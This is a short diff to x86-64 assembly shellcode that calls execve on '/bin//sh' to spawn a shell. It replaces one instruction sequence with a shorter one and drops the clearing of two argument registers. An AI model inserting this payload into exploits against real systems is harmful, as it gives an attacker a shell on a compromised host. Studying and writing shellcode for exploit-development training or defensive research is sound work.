@@ -4,13 +4,10 @@
 
 _start:
 		push		%rax
-		xor		%rdx, %rdx
-		xor		%rsi, %rsi
-		movabs		$0x68732f2f6e69622f, %rbx
-		push		%rbx
-		push		%rsp
-		pop		%rdi
-		mov		$59, %al
+		movabs		$0x68732f2f6e69622f, %rdi
+		push		%rdi
+		mov 		%rsp, %rdi
+		mov		$0x3b, %al
 		syscall
 
 
